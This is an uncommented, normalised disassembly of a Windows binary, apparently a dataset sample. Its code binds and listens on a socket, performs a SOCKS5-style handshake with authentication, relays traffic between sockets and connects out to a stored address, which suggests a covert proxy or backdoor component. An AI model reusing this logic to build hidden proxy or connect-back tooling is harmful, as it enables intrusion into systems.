call sub_405e3c
mov eax [ ebp - 0x2044 ]
lea edx [ ebp - 0x2040 ]
call sub_409bd0
mov edx [ ebp - 0x2040 ]
lea eax [ ebp - 0x4 ]
call sub_4057d4
lea ecx [ ebp - 0x2048 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ ebp - 0x4 ]
call sub_4616b4
mov edx [ ebp - 0x2048 ]
lea eax [ ebp - 0x4 ]
call sub_4055c8
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax edi
call sub_486528
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4868db
lea eax [ ebp - 0x2048 ]
call sub_405530
lea eax [ ebp - 0x2044 ]
mov edx 0x2
call sub_405d40
lea eax [ ebp - 0x203c ]
call sub_405530
lea eax [ ebp - 0x4 ]
call sub_405530
retn
cmp [ ebp - 0xc ] 0x0
jle r-xdata
mov eax [ ebp - 0xc ]
sub eax 0x4
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_4760a4
sub_4868ed
push 0xd0e0048
push esp
push ebx
outsd
arpl [ ebx + 0x73 ] bp
xor eax 0x666e6f43
imul esp [ edi + 0x10 ] 0x2000000
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
or [ eax ] al
add [ eax ] al
nop
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffff94c
push ebx
push esi
push edi
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x1c ]
mov edx [ r-xdata ]
call sub_405fe8
xor eax eax
push ebp
push sub_486e16
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x1c ]
mov ecx 0x10
mov edx [ ebp + 0x8 ]
call sub_408560
mov ebx [ ebp - 0x10 ]
push 0x2
push 0x2
lea eax [ ebp - 0x132 ]
push eax
push ebx
call recv
test eax eax
jle r-xdata
push ebx
call closesocket
push esi
call closesocket
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_486e1d
lea eax [ ebp - 0x1c ]
mov edx [ r-xdata ]
call sub_4060ac
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_405554
retn
cmp [ ebp - 0x132 ] 0x5
jne r-xdata
push 0x0
movzx eax [ ebp - 0x131 ]
add eax 0x2
push eax
lea eax [ ebp - 0x132 ]
push eax
push ebx
call recv
movzx edx [ ebp - 0x131 ]
dec edx
test edx edx
jl r-xdata
inc edx
mov [ ebp - 0x24 ] 0x0
lea eax [ ebp - 0x130 ]
movzx edx [ eax ]
cmp dl 0x2
jne r-xdata
test dl dl
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
movzx eax [ ebp - 0x131 ]
cmp eax [ ebp - 0x24 ]
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov [ ebp - 0x131 ] 0x2
push 0x0
push 0x2
lea eax [ ebp - 0x132 ]
push eax
push ebx
call send
push 0x0
push 0x259
lea eax [ ebp - 0x399 ]
push eax
push ebx
call recv
cmp [ ebp - 0x399 ] 0x1
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push 0x2
push 0xc
lea eax [ ebp - 0x140 ]
push eax
push ebx
call recv
cmp [ ebp - 0x13f ] 0x1
jne r-xdata
mov [ ebp - 0x131 ] 0xff
push 0x0
push 0x2
lea eax [ ebp - 0x132 ]
push eax
push ebx
call send
jmp r-xdata
mov [ ebp - 0x131 ] 0xff
push 0x0
push 0x2
lea eax [ ebp - 0x132 ]
push eax
push ebx
call send
jmp r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
movzx ecx [ ebp - 0x398 ]
lea edx [ ebp - 0x397 ]
lea eax [ ebp - 0x4 ]
call sub_405620
lea edx [ ebp - 0x399 ]
add edx 0x3
movzx eax [ ebp - 0x398 ]
movzx ecx al
add edx ecx
movzx eax al
add eax 0x2
movzx ecx [ ebp + eax - 0x399 ]
lea eax [ ebp - 0x8 ]
call sub_405620
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
call sub_405974
jne r-xdata
mov [ ebp - 0x131 ] 0x0
push 0x0
push 0x2
lea eax [ ebp - 0x132 ]
push eax
push ebx
call send
jmp r-xdata
lea eax [ ebp - 0x15a0 ]
xor ecx ecx
mov edx 0x10
call sub_403af4
movzx eax [ ebp - 0x13d ]
cmp al 0x1
jne r-xdata
mov [ ebp - 0x131 ] 0x0
push 0x0
push 0x2
lea eax [ ebp - 0x132 ]
push eax
push ebx
call send
jmp r-xdata
mov [ ebp - 0x398 ] 0xff
push 0x0
push 0x2
lea eax [ ebp - 0x399 ]
push eax
push ebx
call send
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_405974
jne r-xdata
cmp al 0x3
jne r-xdata
push 0x0
push 0xc
lea eax [ ebp - 0x140 ]
push eax
push ebx
call recv
movzx eax [ ebp - 0x138 ]
mov [ ebp - 0x159e ] ax
lea edx [ ebp - 0x13c ]
lea eax [ ebp - 0x159c ]
mov ecx 0x4
call sub_408560
jmp r-xdata
mov [ ebp - 0x398 ] 0x0
push 0x0
push 0x2
lea eax [ ebp - 0x399 ]
push eax
push ebx
call send
jmp r-xdata
mov [ ebp - 0x15a0 ] 0x2
push 0x0
push 0x1
push 0x2
call socket
mov esi eax
push 0x10
lea eax [ ebp - 0x15a0 ]
push eax
push esi
call connect
test eax eax
jne r-xdata
lea eax [ ebp - 0x58e ]
xor ecx ecx
mov edx 0x1f5
call sub_403af4
push 0x0
movzx eax [ ebp - 0x13c ]
add eax 0x7
push eax
lea eax [ ebp - 0x58e ]
push eax
push ebx
call recv
movzx ecx [ ebp - 0x13c ]
lea edx [ ebp - 0x58e ]
add edx 0x5
lea eax [ ebp - 0xc ]
call sub_405620
mov eax [ ebp - 0xc ]
call sub_4059dc
push eax
call gethostbyname
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
lea edx [ ebp - 0x159c ]
mov [ edx ] eax
lea eax [ ebp - 0x58e ]
add eax 0x6
movzx edx [ ebp - 0x13c ]
add eax edx
movzx eax [ eax ]
push eax
call htons
mov [ ebp - 0x159e ] ax
mov [ ebp - 0x13f ] 0x1
mov [ ebp - 0x13f ] 0x0
jmp r-xdata
push 0x96
call Sleep
jmp r-xdata
lea edx [ ebp - 0x16a4 ]
mov eax esi
call sub_408710
test al al
je r-xdata
mov [ ebp - 0x140 ] 0x5
mov [ ebp - 0x13e ] 0x0
mov [ ebp - 0x13d ] 0x1
lea eax [ ebp - 0x16b4 ]
xor ecx ecx
mov edx 0x10
call sub_403af4
mov [ ebp - 0x30 ] 0x10
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x16b4 ]
push eax
push esi
call getsockname
lea edx [ ebp - 0x16b0 ]
lea eax [ ebp - 0x13c ]
mov ecx 0x4
call sub_408560
movzx eax [ ebp - 0x16b2 ]
mov [ ebp - 0x138 ] ax
push 0x0
push 0xa
lea eax [ ebp - 0x140 ]
push eax
push ebx
call send
mov [ ebp - 0x2c ] 0x5
lea eax [ ebp - 0x16a4 ]
call sub_408738
lea edx [ ebp - 0x16a4 ]
mov eax ebx
call sub_408728
lea edx [ ebp - 0x16a4 ]
mov eax esi
call sub_408728
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x16a4 ]
push eax
push 0x0
call select
inc eax
je r-xdata
lea edx [ ebp - 0x16a4 ]
mov eax ebx
call sub_408710
test al al
je r-xdata
lea eax [ ebp - 0x158e ]
xor ecx ecx
mov edx 0x1000
call sub_403af4
push 0x0
push 0x1000
lea eax [ ebp - 0x158e ]
push eax
push esi
call recv
mov edi eax
cmp edi 0xffffffff
je r-xdata
lea eax [ ebp - 0x158e ]
xor ecx ecx
mov edx 0x1000
call sub_403af4
push 0x0
push 0x1000
lea eax [ ebp - 0x158e ]
push eax
push ebx
call recv
mov edi eax
cmp edi 0xffffffff
je r-xdata
push 0x0
push edi
lea eax [ ebp - 0x158e ]
push eax
push ebx
call send
push 0x0
push edi
lea eax [ ebp - 0x158e ]
push eax
push esi
call send
sub_486e2c
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
push esi
push edi
xor eax eax
mov [ ebp - 0x68 ] eax
mov [ ebp - 0x60 ] eax
mov [ ebp - 0x64 ] eax
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x48 ] eax
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
call sub_405fe8
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
mov ecx 0x10
mov edx [ ebp + 0x8 ]
call sub_408560
push 0x6
push 0x1
push 0x2
call socket
mov esi eax
lea eax [ ebp - 0x30 ]
xor ecx ecx
mov edx 0x10
call sub_403af4
mov [ ebp - 0x30 ] 0x2
movzx eax [ ebp - 0x10 ]
push eax
call htons
mov [ ebp - 0x2e ] ax
xor eax eax
mov [ ebp - 0x2c ] eax
push 0x10
lea eax [ ebp - 0x30 ]
push eax
push esi
call bind
test eax eax
jne r-xdata
mov eax [ ebx ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x64 ]
call sub_409e5c
mov ecx [ ebp - 0x64 ]
lea eax [ ebp - 0x60 ]
mov edx r-xdata
call sub_405864
mov eax [ ebp - 0x60 ]
call sub_487a30
mov eax [ ebx ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x68 ]
call sub_409e5c
mov eax [ ebp - 0x68 ]
call sub_487488
push 0x5
push esi
call listen
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x48 ]
call sub_409e5c
mov ecx [ ebp - 0x48 ]
lea eax [ ebp - 0x44 ]
mov edx r-xdata
call sub_405864
mov eax [ ebp - 0x44 ]
call sub_487a30
lea edx [ ebp - 0x4c ]
mov eax esi
call sub_409d70
mov eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x10 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x50 ]
call sub_409e5c
mov eax [ ebp - 0x50 ]
pop edx
call sub_4870d4
mov eax [ ebx ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x58 ]
call sub_409e5c
mov ecx [ ebp - 0x58 ]
lea eax [ ebp - 0x54 ]
mov edx r-xdata
call sub_405864
mov eax [ ebp - 0x54 ]
call sub_487a30
mov eax [ ebx ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x5c ]
call sub_409e5c
mov eax [ ebp - 0x5c ]
call sub_487488
jmp r-xdata
push 0x10
push 0x40
call LocalAlloc
mov ebx eax
mov edi ebx
mov eax [ ebp - 0x10 ]
mov [ edi ] eax
lea eax [ edi + 0x4 ]
mov edx [ ebp - 0xc ]
call sub_405584
lea eax [ edi + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_405584
mov eax [ ebp - 0x18 ]
mov [ edi + 0xc ] eax
lea eax [ ebp - 0x1c ]
push eax
push 0x0
push ebx
push r-xdata
push 0x0
push 0x0
call CreateThread
push eax
call CloseHandle
jmp r-xdata
push 0x0
call ExitThread
push 0x64
call Sleep
jmp r-xdata
mov [ ebp - 0x20 ] 0x10
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
push esi
call accept
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0xffffffff
je r-xdata
sub_4870d4
push ebp
mov ebp esp
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
mov eax [ ebp - 0x8 ]
call sub_4059cc
xor eax eax
push ebp
push sub_4872fc
push [ fs : eax ]
mov [ fs : eax ] esp
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_4872da
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jg r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
call sub_404f70
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
inc esi
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_487303
lea eax [ ebp - 0x24 ]
mov edx 0x9
call sub_405554
retn
inc ebx
dec esi
jne r-xdata
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0x8 ]
call sub_4055c8
push [ ebp - 0xc ]
push r-xdata
push [ ebp - 0x10 ]
push r-xdata
push [ ebp - 0x14 ]
push r-xdata
push [ ebp - 0x18 ]
push r-xdata
push [ ebp - 0x1c ]
lea eax [ ebp - 0x24 ]
mov edx 0x9
call sub_4058e0
mov ecx [ ebp - 0x24 ]
mov edx ebx
mov eax [ rw-data ]
mov esi [ eax ]
call [ esi + 0x20 ]
jmp r-xdata
lea ecx [ ebp - 0x20 ]
mov edx ebx
mov eax [ rw-data ]
mov edi [ eax ]
call [ edi + 0xc ]
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x20 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x20 ]
call sub_405a44
mov edx [ ebp - 0x20 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x20 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x10 ]
push eax
mov edx [ ebp - 0x20 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x20 ]
call sub_405a44
mov edx [ ebp - 0x20 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x20 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x20 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x20 ]
call sub_405a44
mov edx [ ebp - 0x20 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x20 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x20 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x20 ]
call sub_405a44
mov edx [ ebp - 0x20 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x20 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0x20 ]
call sub_4055c8
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
call sub_405974
jne r-xdata
sub_487318
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_487468
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x11 ] 0x0
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_487446
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jg r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
call sub_404f70
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48746f
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_405554
retn
inc esi
dec ebx
jne r-xdata
mov [ ebp - 0x11 ] 0x1
jmp r-xdata
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ rw-data ]
mov edi [ eax ]
call [ edi + 0xc ]
lea eax [ ebp - 0x8 ]
push eax
mov edx [ ebp - 0x10 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x10 ]
call sub_405a44
mov edx [ ebp - 0x10 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x10 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x10 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x10 ]
call sub_405a44
mov edx [ ebp - 0x10 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x10 ]
mov edx 0x1
call sub_405a84
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_405974
jne r-xdata
sub_487488
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_487671
push [ fs : eax ]
mov [ fs : eax ] esp
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_48764f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jg r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
call sub_404f70
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
inc esi
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_487678
lea eax [ ebp - 0x1c ]
mov edx 0x7
call sub_405554
retn
inc ebx
dec esi
jne r-xdata
mov eax [ ebp - 0x18 ]
call sub_409edc
push eax
call closesocket
mov edx ebx
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
jmp r-xdata
lea ecx [ ebp - 0x1c ]
mov edx ebx
mov eax [ rw-data ]
mov edi [ eax ]
call [ edi + 0xc ]
lea eax [ ebp - 0x8 ]
push eax
mov edx [ ebp - 0x1c ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x1c ]
call sub_405a44
mov edx [ ebp - 0x1c ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x1c ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x1c ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x1c ]
call sub_405a44
mov edx [ ebp - 0x1c ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x1c ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x10 ]
push eax
mov edx [ ebp - 0x1c ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x1c ]
call sub_405a44
mov edx [ ebp - 0x1c ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x1c ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x1c ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x1c ]
call sub_405a44
mov edx [ ebp - 0x1c ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x1c ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x1c ]
call sub_4055c8
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_405974
jne r-xdata
sub_48768c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_487887
push [ fs : eax ]
mov [ fs : eax ] esp
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_487865
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jg r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
call sub_404f70
jmp r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x44 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
inc eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48788e
lea eax [ ebp - 0x18 ]
mov edx 0x6
call sub_405554
retn
inc [ ebp - 0x1c ]
dec [ ebp - 0x20 ]
jne r-xdata
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x1c ]
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0xc ]
lea eax [ ebp - 0x4 ]
push eax
mov edx [ ebp - 0x18 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x18 ]
call sub_405a44
mov edx [ ebp - 0x18 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x18 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x8 ]
push eax
mov edx [ ebp - 0x18 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x18 ]
call sub_405a44
mov edx [ ebp - 0x18 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x18 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x18 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x18 ]
call sub_405a44
mov edx [ ebp - 0x18 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x18 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x10 ]
push eax
mov edx [ ebp - 0x18 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x18 ]
call sub_405a44
mov edx [ ebp - 0x18 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x18 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x18 ]
call sub_4055c8
xor eax eax
push ebp
push sub_48782d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
call sub_409edc
push eax
call closesocket
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_4878a4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
mov eax [ ebp - 0x8 ]
call sub_4059cc
mov eax [ ebp - 0xc ]
call sub_4059cc
mov eax [ ebp + 0x8 ]
call sub_4059cc
xor eax eax
push ebp
push sub_487a08
push [ fs : eax ]
mov [ fs : eax ] esp
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_4879d1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_487318
test al al
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0xc ]
push r-xdata
push [ ebp + 0x8 ]
push r-xdata
lea eax [ ebp - 0x10 ]
mov edx 0x8
call sub_4058e0
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
push 0x10
push 0x40
call LocalAlloc
mov esi eax
mov ebx esi
mov eax [ ebp - 0x8 ]
call sub_409edc
mov [ ebx ] eax
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
call sub_409b7c
mov edx [ ebp - 0x18 ]
lea eax [ ebx + 0x4 ]
call sub_405584
lea edx [ ebp - 0x1c ]
mov eax [ ebp + 0x8 ]
call sub_409b7c
mov edx [ ebp - 0x1c ]
lea eax [ ebx + 0x8 ]
call sub_405584
xor eax eax
mov [ ebx + 0xc ] eax
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push esi
push sub_486e2c
push 0x0
push 0x0
call CreateThread
push eax
call CloseHandle
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
call sub_404f70
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_487a0f
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_405554
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_405554
lea eax [ ebp + 0x8 ]
call sub_405530
retn
sub_487a30
push ebp
mov ebp esp
add esp 0xfffffff8
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_487a87
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
call sub_405864
mov eax [ ebp - 0x8 ]
call sub_475e2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_487a8e
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
sub_487aa9
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_487ae7
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_487aee
retn
mov eax [ rw-data ]
call sub_404650
push rw-data
call DeleteCriticalSection
sub_487af4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
jpo r-xdata
add [ eax ] al
add [ eax + eax ] cl
add al bh
jg r-xdata
add esp 0xfffff004
push eax
dec eax
mov eax [ ebp - 0x4 ]
add esp 0xffffffdc
push ebx
push esi
xor edx edx
mov [ ebp - 0x2024 ] edx
mov [ ebp - 0x2028 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call CoInitialize
push 0x0
push 0x1
push 0x2
call socket
mov esi eax
cmp esi 0xffffffff
je r-xdata
jne r-xdata
add [ ecx - 0xffb3c ] al
call [ eax + 0x48 ]
add [ eax + 0x78004048 ] bl
sti
inc ecx
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ ebx + edi * 8 ] al
inc ecx
add [ esp + edi * 8 ] ch
inc ecx
add [ ebx + edi * 2 + 0x48 ] dl
add [ esi ] cl
push esp
inc ebx
popad
jo r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov [ ebp - 0x2020 ] 0x2
mov eax [ rw-data ]
movzx eax [ eax ]
push eax
call htons
mov [ ebp - 0x201e ] ax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call inet_addr
mov ebx eax
mov [ ebp - 0x201c ] ebx
inc ebx
jne r-xdata
cmpsb [ esi ] [ edi ]
or edi eax
jmp [ esi - 0x77 ]
jne r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
call sub_40f944
push 0x10
lea eax [ ebp - 0x2020 ]
push eax
push esi
call connect
push 0x0
push 0x1
lea eax [ ebp - 0x2010 ]
push eax
push esi
call recv
inc eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call gethostbyname
test eax eax
je r-xdata
push edi
bound esp [ gs : ebx + 0x61 ]
insd
nop
push ebp
mov ebp esp
push eax
mov eax 0x2
push 0x2
push esi
call shutdown
push esi
call closesocket
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x2028 ]
mov edx 0x2
call sub_405554
retn
mov eax [ ebp - 0x10 ]
call sub_464e3c
lea eax [ ebp - 0x10 ]
call sub_40f944
lea edx [ ebp - 0x2028 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_409d70
mov ecx [ ebp - 0x2028 ]
lea eax [ ebp - 0x2024 ]
mov edx r-xdata
call sub_405864
mov edx [ ebp - 0x2024 ]
mov eax esi
